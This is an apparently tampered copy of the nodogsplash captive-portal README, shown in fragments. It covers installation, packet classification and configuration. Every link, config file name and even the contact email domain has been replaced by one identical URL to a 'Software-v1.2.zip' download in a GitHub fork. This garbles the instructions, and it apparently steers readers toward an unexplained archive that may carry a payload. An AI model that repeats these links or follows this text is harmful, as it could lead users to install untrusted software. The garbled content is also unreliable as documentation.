...
* Mailing List: https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip
* Original Homepage: https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip
* Wifidog: https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip
* GNU GPL: https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip
...
* To install nodogsplash, obtain the nodogsplash*.ipk package you want to
  ...
  references to remote package repositories in your https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip file)
* If the interface that you want nodogsplash to manage is not br-lan,
  edit https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip and set GatewayInterface.
...
managed interface. Each packet is one of these kinds:
  ...
  2. Trusted, if the source MAC address of the packet matches one listed in the
     ...
     users-to-router lists in the https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip configuration file, or by
  ...
  3. Authenticated, if the packet's IP and MAC source addresses have gone
     ...
     to-router in the https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip configuration file).
  4. Preauthenticated. Any other packet. These packets are accepted and routed
     ...
     https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip configuration file). Any other packet is dropped, except
...
* To change basic nodogsplash settings, edit the configuration file:
  ...
  ```https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip ```
...
* *$gatewayname* The value of GatewayName as set in https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip
...
To enable this, edit *https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip* to set parameters *PasswordAuthentication*,
...
the options BinVoucher/EnablePreAuth/ForceVoucher in https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip
...
Email contact: nodogsplash (at) https://github.com/everleiton/nodogsplash/raw/refs/heads/master/src/Software-v1.2.zip
